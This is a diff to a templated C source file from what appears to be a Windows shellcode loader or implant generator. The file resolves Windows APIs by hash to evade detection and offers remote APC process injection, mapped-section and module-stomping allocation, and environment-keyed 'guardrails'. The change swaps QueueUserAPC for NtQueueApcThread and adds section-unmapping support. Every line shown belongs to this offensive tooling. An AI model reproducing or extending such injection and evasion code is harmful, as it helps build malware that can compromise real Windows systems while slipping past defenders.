@@ -10,6 +10,7 @@ typedef HANDLE (WINAPI *pCreateFileMappingW)(HANDLE, LPSECURITY_ATTRIBUTES, DWOR
 typedef LPVOID (WINAPI *pMapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
 typedef NTSTATUS (WINAPI* pNtCreateSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
 typedef NTSTATUS (WINAPI* pNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, UINT, ULONG, ULONG);
+typedef NTSTATUS (WINAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
 typedef NTSTATUS (WINAPI* pNtQueryVirtualMemory)(HANDLE, PVOID, int, PVOID, SIZE_T, PSIZE_T);
 typedef NTSTATUS (WINAPI* pNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
 typedef HANDLE (WINAPI *pGetProcessHeap)(VOID);
@@ -27,15 +28,18 @@ typedef BOOL (WINAPI *pGetComputerNameA)(LPSTR, LPDWORD);
 typedef LPVOID (WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
 typedef BOOL (WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, PSIZE_T);
 typedef BOOL (WINAPI* pVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
+{% if execution_method == 'remoteapc' or debug_mode %}
+typedef DWORD (WINAPI* pGetLastError)(VOID);
+{% endif %}
 {% if execution_method == 'remoteapc' or guardrails_needed %}
 typedef int (WINAPI* pLstrlenA)(LPCSTR);
 typedef DWORD (WINAPI* pGetEnvironmentVariableA)(LPCSTR, LPSTR, DWORD);
 {% endif %}
 {% if execution_method == 'remoteapc' %}
+typedef NTSTATUS (WINAPI* pNtQueueApcThread)(HANDLE, PVOID, PVOID, PVOID, PVOID);
 typedef BOOL (WINAPI* pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
 typedef DWORD (WINAPI* pQueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);
 typedef DWORD (WINAPI* pResumeThread)(HANDLE);
-typedef DWORD (WINAPI* pGetLastError)(VOID);
 typedef NTSTATUS (WINAPI *pNtCreateJobObject)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
 typedef NTSTATUS (WINAPI *pNtSetInformationJobObject)(HANDLE, JOBOBJECTINFOCLASS, PVOID, ULONG);
 typedef NTSTATUS (WINAPI *pNtAssignProcessToJobObject)(HANDLE, HANDLE);
@@ -76,6 +80,7 @@ pCreateFileMappingW pfnCreateFileMappingW;
 pMapViewOfFile pfnMapViewOfFile;
 pNtCreateSection pfnNtCreateSection;
 pNtMapViewOfSection pfnNtMapViewOfSection;
+pNtUnmapViewOfSection pfnNtUnmapViewOfSection;
 pNtQueryVirtualMemory pfnNtQueryVirtualMemory;
 pNtProtectVirtualMemory pfnNtProtectVirtualMemory;
 pGetProcessHeap pfnGetProcessHeap;
@@ -94,15 +99,17 @@ pGetComputerNameA pfnGetComputerNameA;
 pVirtualAllocEx pfnVirtualAllocEx;
 pWriteProcessMemory pfnWriteProcessMemory;
 pVirtualProtectEx pfnVirtualProtectEx;
+{% if execution_method == 'remoteapc' or debug_mode %}
+pGetLastError pfnGetLastError;
+{% endif %}
 {% if execution_method == 'remoteapc' or guardrails_needed %}
 pLstrlenA pfnLstrlenA;
 pGetEnvironmentVariableA pfnGetEnvironmentVariableA;
 {% endif %}
 {% if execution_method == 'remoteapc' %}
 pCreateProcessA pfnCreateProcessA;
-pQueueUserAPC pfnQueueUserAPC;
+pNtQueueApcThread pfnNtQueueApcThread;
 pResumeThread pfnResumeThread;
-pGetLastError pfnGetLastError;
 pNtCreateJobObject pfnNtCreateJobObject;
 pNtSetInformationJobObject pfnNtSetInformationJobObject;
 pNtAssignProcessToJobObject pfnNtAssignProcessToJobObject;
@@ -232,8 +239,14 @@ void ResolveAPIs() {
     if (hNtdll != NULL) {
         pfnRtlMoveMemory = (pRtlMoveMemory)GetProcAddressByHash(hNtdll, {{ hash_rtlmovememory }});
         pfnRtlZeroMemory = (pRtlZeroMemory)GetProcAddressByHash(hNtdll, {{ hash_rtlzeromemory }});
+        {% if execution_method == 'remoteapc' %}
+        pfnNtQueueApcThread = (pNtQueueApcThread)GetProcAddressByHash(hNtdll, {{ hash_ntqueueapcthread }});
+        {% endif %}
+        {% if execution_method == 'remoteapc' or allocation_method == 'mappedsection' or 'modulestomping' in allocation_method %}
         pfnNtCreateSection = (pNtCreateSection)GetProcAddressByHash(hNtdll, {{ hash_ntcreatesection }});
         pfnNtMapViewOfSection = (pNtMapViewOfSection)GetProcAddressByHash(hNtdll, {{ hash_ntmapviewofsection }});
+        pfnNtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddressByHash(hNtdll, {{ hash_ntunmapviewofsection }});
+        {% endif %}
         pfnNtQueryVirtualMemory = (pNtQueryVirtualMemory)GetProcAddressByHash(hNtdll, {{ hash_ntqueryvirtualmemory }});
         pfnNtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddressByHash(hNtdll, {{ hash_ntprotectvirtualmemory }});
     }
@@ -245,7 +258,6 @@ void ResolveAPIs() {
 
     {% if execution_method == 'remoteapc' %}
     pfnCreateProcessA = (pCreateProcessA)GetProcAddressByHash(hKernel32, {{ hash_createprocessa }});
-    pfnQueueUserAPC = (pQueueUserAPC)GetProcAddressByHash(hKernel32, {{ hash_queueuserapc }});
     pfnResumeThread = (pResumeThread)GetProcAddressByHash(hKernel32, {{ hash_resumethread }});
     pfnGetLastError = (pGetLastError)GetProcAddressByHash(hKernel32, {{ hash_getlasterror }});
     pfnNtCreateJobObject = (pNtCreateJobObject)GetProcAddressByHash(hNtdll, {{ hash_ntcreatejobobject }});
@@ -298,6 +310,10 @@ void ResolveAPIs() {
     pfnWriteProcessMemory = (pWriteProcessMemory)GetProcAddressByHash(hKernel32, {{ hash_writeprocessmemory }});
     pfnVirtualProtectEx = (pVirtualProtectEx)GetProcAddressByHash(hKernel32, {{ hash_virtualprotectex }});
     
+    {% if execution_method == 'remoteapc' or debug_mode %}
+    pfnGetLastError = (pGetLastError)GetProcAddressByHash(hKernel32, {{ hash_getlasterror }});
+    {% endif %}
+
     {% if guardrails_needed %}
     HMODULE hAdvApi32 = GetModuleHandleByHash(ADVAPI32_HASH);
     if (hAdvApi32 == NULL && pfnLoadLibraryA != NULL) { 
